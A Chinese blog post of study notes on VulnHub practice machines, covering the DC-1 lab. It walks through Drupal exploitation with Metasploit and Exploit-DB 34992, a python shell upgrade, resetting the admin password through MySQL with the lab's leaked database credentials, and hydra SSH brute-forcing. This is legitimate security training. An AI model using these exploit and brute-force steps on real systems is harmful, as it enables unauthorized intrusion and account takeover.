<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221104170743086.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221104170808449.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221104171635506.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221104172732031.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221104173707687.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221104173836066.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221106151711523.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108134734459.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108190437827.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108191059284.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108192408036.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108192756267.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108193016082.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108193044669.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108200530705.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108193350489.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108204306618.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108204334859.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108200416113.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108201422820.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108201357084.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108210813828.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108220741696.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108204728050.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108205228054.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108205526638.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108211543340.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108211618643.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108211705028.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108213915226.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108214049547.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108214257074.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108221734407.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108222201419.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108214344792.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108214506480.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108214544456.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108222721847.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108222833431.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108223018151.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108223338919.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108223431583.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108223720859.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108223847293.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108223953100.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108224111044.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108224357240.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108224501582.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108224728118.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108224803164.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221108225235107.png">
<meta property="og:image" content="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221117130716527.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221117134302741.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221117130822881.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221117131146601.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221117131950416.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221117131405964.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221119232447671.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221119232601421.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20221119234606473.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20230222151129426.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20230222152248020.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20230222152313081.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20230222152956576.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20230222153353400.png">
<meta property="og:image" content="https://ttoc.xin/vulnhub/image-20230222153942426.png">
<meta property="article:published_time" content="2022-08-29T07:06:05.187Z">
<meta property="article:modified_time" content="2023-08-06T08:01:01.385Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="靶场">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.xin/vulnhub/image-20220829153949360.png">

<link rel="canonical" href="https://ttoc.xin/vulnhub/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Vulnhub靶场学习笔记 | Ttoc's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ttoc's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/vulnhub/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ttoc">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ttoc's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Vulnhub靶场学习笔记
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-29 15:06:05" itemprop="dateCreated datePublished" datetime="2022-08-29T15:06:05+08:00">2022-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-06 16:01:01" itemprop="dateModified" datetime="2023-08-06T16:01:01+08:00">2023-08-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">网络安全学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><u><code>学习一下实战靶场，做一下笔记</code></u></p>
<p><code>实战环境，</code></p>
<p><code>信息收集的能力决定了能否渗透成功，以及自己会浪费自己多少时间</code></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>官网下载地址</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.vulnhub.com/">http://www.vulnhub.com/</a></p>
</blockquote>
<p>这里提一下靶场机<code>ip</code>怎么看</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span> </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220829153949360.png"><img src="/vulnhub/image-20220829153949360.png" alt="image-20220829153949360"></a></p>
<blockquote>
<p><code>nmap -sP  192.168.133.134/24</code><br>&#x2F;&#x2F;192.168.133.134是虚拟机ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220829154027029.png"><img src="/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></a></p>
<p>找到靶机<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>习惯性用<code>nmap</code>扫一下它端口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220829154322453.png"><img src="/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></a></p>
<hr>
<h1 id="DC系列【1-9】-完"><a href="#DC系列【1-9】-完" class="headerlink" title="DC系列【1~9】(完)"></a>DC系列【1~9】(完)</h1><h1 id="一、DC-1-初级"><a href="#一、DC-1-初级" class="headerlink" title="一、DC-1[初级]"></a>一、DC-1[初级]</h1><p><strong>five flags</strong></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>浏览器访问靶机<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>这是开始界面</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220829154626618.png"><img src="/vulnhub/image-20220829154626618.png" alt="image-20220829154626618"></a></p>
<p>这里介绍一个插件<code>Wappalyzer</code>，它能够获取网页自身的框架和编写的语言，这样就不用查看网络返回包来分析了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830094043837.png"><img src="/vulnhub/image-20220830094043837.png" alt="image-20220830094043837"></a></p>
<p>可以看到网站是用<code>php</code>语言编写的，<code>CMS</code>是<code>Drupal</code></p>
<hr>
<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>先用<code>msf</code>看看有没有<code>drupal</code>相应的攻击脚本</p>
<blockquote>
<p>终端输入<code>msfconsole</code>，进入<code>msf</code>界面，或者菜单也可以打开</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830094506049.png"><img src="/vulnhub/image-20220830094506049.png" alt="image-20220830094506049"></a></p>
<blockquote>
<p>输入<code>search drupal</code>，找一下有没有drupal可以利用的脚本<br><em>对于其他命令，可以用help查询</em></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830094939297.png"><img src="/vulnhub/image-20220830094939297.png" alt="image-20220830094939297"></a></p>
<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>
<blockquote>
<p>输入<code>use 1</code>，进入编号1脚本的运行环境</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830095106784.png"><img src="/vulnhub/image-20220830095106784.png" alt="image-20220830095106784"></a></p>
<blockquote>
<p>输入<code>show options</code>,查看脚本运行的所需要配置的项目</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830105519336.png"><img src="/vulnhub/image-20220830105519336.png" alt="image-20220830105519336"></a></p>
<blockquote>
<p><code>Required</code>是要求填的，<code>yes</code>是必填项，<code>no</code>是非必填项</p>
</blockquote>
<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>
<blockquote>
<p>输入<code>set RHOSTS 192.168.133.136</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110143969.png"><img src="/vulnhub/image-20220830110143969.png" alt="image-20220830110143969"></a></p>
<blockquote>
<p>再输入<code>run</code>，运行脚本</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110303594.png"><img src="/vulnhub/image-20220830110303594.png" alt="image-20220830110303594"></a></p>
<blockquote>
<p>输入<code>shell</code>，进入<code>shell</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110551273.png"><img src="/vulnhub/image-20220830110551273.png" alt="image-20220830110551273"></a></p>
<blockquote>
<p>输入<code>whoami</code>，查看当前的权限</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110648417.png"><img src="/vulnhub/image-20220830110648417.png" alt="image-20220830110648417"></a></p>
<p>发现是个低权限的账号</p>
<blockquote>
<p>输入<code>ls</code>，可以查看到当前的目录文件</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110825217.png"><img src="/vulnhub/image-20220830110825217.png" alt="image-20220830110825217"></a></p>
<p>但是一堆东西挤在一起，还是有些不太方便</p>
<h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="*交互式shell"></a><code>*交互式shell</code></h3><p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110907408.png"><img src="/vulnhub/image-20220830110907408.png" alt="image-20220830110907408"></a></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830142759540.png"><img src="/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></a></p>
<p>发现<code>flag1.txt</code></p>
<blockquote>
<p>输入<code>cat flag1.txt</code>查看</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830142915555.png"><img src="/vulnhub/image-20220830142915555.png" alt="image-20220830142915555"></a></p>
<blockquote>
<p><code>Every good CMS needs a config file - and so do you.</code><br>意思是：一个好的CMS（内容管理系统）需要一个config file（配置文件）</p>
<p>也就是我们需要看看它的配置文件，这是Flag2的线索</p>
</blockquote>
<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>在目录下我们发现有个<code>sites</code>目录，也就是站点目录，里面很有可能有配置文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830142759540.png"><img src="/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></a></p>
<blockquote>
<p>输入<code>cd sites;ls -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830143404972.png"><img src="/vulnhub/image-20220830143404972.png" alt="image-20220830143404972"></a></p>
<p>有个<code>default</code>（默认）目录，查看一下</p>
<blockquote>
<p>输入<code>cd default;ls -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830143517235.png"><img src="/vulnhub/image-20220830143517235.png" alt="image-20220830143517235"></a></p>
<p>看到<code>setting.php</code>也就差不多是<code>config file</code></p>
<blockquote>
<p>输入<code>cat setting.php</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830143752469.png"><img src="/vulnhub/image-20220830143752469.png" alt="image-20220830143752469"></a></p>
<p>得到<code>Flag2</code></p>
<blockquote>
<ul>
<li><p><code>flag2</code></p>
</li>
<li><p><code>Brute force and dictionary attacks aren&#39;t the</code></p>
</li>
<li><p><code>only ways to gain access (and you WILL need access).</code></p>
</li>
<li><p><code>What can you do with these credentials?</code></p>
<p> 意思是：暴力和字典攻击不是获得访问权限的唯一方法（您将需要访问权限）。<br> 你能用这些证书做什么？</p>
</li>
</ul>
<p>就是说不要局限于爆破密码来登录admin用户，你拥有了数据库这些信息，你可以做什么</p>
</blockquote>
<hr>
<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>关键分析这里，这是靶机数据库的用户名和密码的信息，</p>
<p>有了这个我们就可以进入靶机的数据库，对里面的数据库进行修改或增添</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">     <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   )</span><br></pre></td></tr></table></figure>

<h3 id="1）mysql数据库修改admin用户的密码（或者新建一个用户密码）"><a href="#1）mysql数据库修改admin用户的密码（或者新建一个用户密码）" class="headerlink" title="1）mysql数据库修改admin用户的密码（或者新建一个用户密码）"></a>1）mysql数据库修改admin用户的密码（或者新建一个用户密码）</h3><blockquote>
<p>输入<code>mysql -udbuser -pR0ck3t</code></p>
<p>*注意这里-u和-p后面没有空格，有空格会报错</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830151236620.png"><img src="/vulnhub/image-20220830151236620.png" alt="image-20220830151236620"></a></p>
<p>先看看数据库</p>
<blockquote>
<p>输入<code>show databases;</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830151531028.png"><img src="/vulnhub/image-20220830151531028.png" alt="image-20220830151531028"></a></p>
<p>查看<code>drupaldb</code>库里的表</p>
<blockquote>
<p>输入<code>use drupaldb;</code><br>然后输入<code>show tables;</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830151716900.png"><img src="/vulnhub/image-20220830151716900.png" alt="image-20220830151716900"></a></p>
<p>看到<code>users</code>表，这就是我们登录成功的关键，查看该表</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830151829478.png"><img src="/vulnhub/image-20220830151829478.png" alt="image-20220830151829478"></a></p>
<p>发现有两个用户，我们的目的是修改或者获得admin用户的密码，当然也可以再创建一个用户，但是都需要加密</p>
<blockquote>
<p>因为这里我们可以发现用户的密码是被加密了的，那加密文件肯定是在脚本目录里，也就是scripts目录里，利用加密脚本，把我们的密码加密，然后更新数据库里admin用户原本的密码</p>
</blockquote>
<p>我们来找找密码加密脚本在哪里</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830142759540.png"><img src="/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></a></p>
<p>看到<code>scripts</code>目录</p>
<p>进入查看</p>
<blockquote>
<p>输入<code>cd scripts;ls -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830152428416.png"><img src="/vulnhub/image-20220830152428416.png" alt="image-20220830152428416"></a></p>
<p>发现有一个<code>password-hash.sh</code>文件，密码就是通过它进行hash加密的</p>
<p>运行它，让它把我们的密码加密</p>
<blockquote>
<p>输入<code>./password-hash.sh  123456</code></p>
</blockquote>
<hr>
<p>但是运行可能会出现如下错误，如果没有请忽略</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830152851541.png"><img src="/vulnhub/image-20220830152851541.png" alt="image-20220830152851541"></a></p>
<p>报错说</p>
<blockquote>
<p><code>include_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory</code> </p>
</blockquote>
<p>也就是找不到该文件，但是发现，includes目录确实也不在scripts目录下，于是用cp把<code>includes</code>目录放到<code>scripts</code>目录下即可</p>
<blockquote>
<p>输入<code>cp -r ../includes ./</code></p>
</blockquote>
<hr>
<p>得到加密数据</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830153417077.png"><img src="/vulnhub/image-20220830153417077.png" alt="image-20220830153417077"></a></p>
<p>再次进入<code>mysql</code>数据库，修改 <code>admin</code>密码</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="built_in">set</span> <span class="attribute">pass</span>=<span class="string">&quot;<span class="variable">$S</span><span class="variable">$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x</span>&quot;</span> where <span class="attribute">name</span>=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830161703412.png"><img src="/vulnhub/image-20220830161703412.png" alt="image-20220830161703412"></a></p>
<p>我们试试能不能登录</p>
<blockquote>
<p>用户名：<code>admin</code></p>
<p>密码：<code>123456</code></p>
</blockquote>
<p>登录成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830161808584.png"><img src="/vulnhub/image-20220830161808584.png" alt="image-20220830161808584"></a></p>
<p>得到flag3</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830161837967.png"><img src="/vulnhub/image-20220830161837967.png" alt="image-20220830161837967"></a></p>
<h3 id="2）利用drupal脚本添加管理员用户"><a href="#2）利用drupal脚本添加管理员用户" class="headerlink" title="2）利用drupal脚本添加管理员用户"></a>2）利用drupal脚本添加管理员用户</h3><p>优点是更加方便，快捷，<strong>但是脚本不是万能的，只有自己明白原理才是真正掌握</strong>，这个的本质也是利用<code>sql</code>注入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">34992</span></span><br></pre></td></tr></table></figure>

<p>该网站在kali里面浏览器书签自带的，这个脚本适用于drupal，直接下载下来用即可</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830145453216.png"><img src="/vulnhub/image-20220830145453216.png" alt="image-20220830145453216"></a></p>
<p>下载好后，运行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python2</span> <span class="number">34992</span>.py -t http://<span class="number">192.168.133.136</span> -u admin001 -p <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>-t就是目标网站，-u就是新建的用户名，-p就是用户名密码<br>*注意这个脚本需要 python2运行，python3语法不符合</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830145642143.png"><img src="/vulnhub/image-20220830145642143.png" alt="image-20220830145642143"></a></p>
<p>然后按照输入的，直接登录就可以了，或者直接点击下面链接</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830153620620.png"><img src="/vulnhub/image-20220830153620620.png" alt="image-20220830153620620"></a></p>
<p>就可以拿到<code>Flag3</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830154431807.png"><img src="/vulnhub/image-20220830154431807.png" alt="image-20220830154431807"></a></p>
<hr>
<h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><h3 id="1）个人方法"><a href="#1）个人方法" class="headerlink" title="1）个人方法"></a>1）个人方法</h3><p>分析一下<code>flag3</code></p>
<blockquote>
<p><code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</code></p>
<p>意思是：Special PERMS特别的权限（应该是root权限），passwd应该是查看&#x2F;etc&#x2F;passwd目录，FIND意思利用find命令，-exec就是需要用它执行命令， get what’s in the shadow意思是flag4在&#x2F;etc&#x2F;shadow里</p>
</blockquote>
<p>我们先看看<code>etc</code>目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830163045108.png"><img src="/vulnhub/image-20220830163045108.png" alt="image-20220830163045108"></a></p>
<p>发现了<code>passwd</code>文件</p>
<blockquote>
<p>输入<code>cat passwd</code></p>
</blockquote>
<p>查看一下内容</p>
<p>发现有<code>flag4</code>的线索</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830163220380.png"><img src="/vulnhub/image-20220830163220380.png" alt="image-20220830163220380"></a></p>
<p><code>flag4</code>是在<code>/home/flag4</code>里面，我们到目录里看看</p>
<blockquote>
<p>输入<code>cd /home/flag4</code></p>
</blockquote>
<p>发现有个<code>flag4.txt</code>，查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830163358828.png"><img src="/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></a></p>
<p>得到<code>flag4</code></p>
<h3 id="2）官方方法"><a href="#2）官方方法" class="headerlink" title="2）官方方法"></a>2）官方方法</h3><p>用了<code>hydra</code>[九头蛇]工具，对我们在<code>passwd</code>里看到<code>flag4</code>用户进行爆破</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -<span class="selector-tag">p</span> /usr/share/wordlists/rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span> <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是<br>用户所在的网站</p>
<p>上面-p的文件是自己下载的密码包</p>
</blockquote>
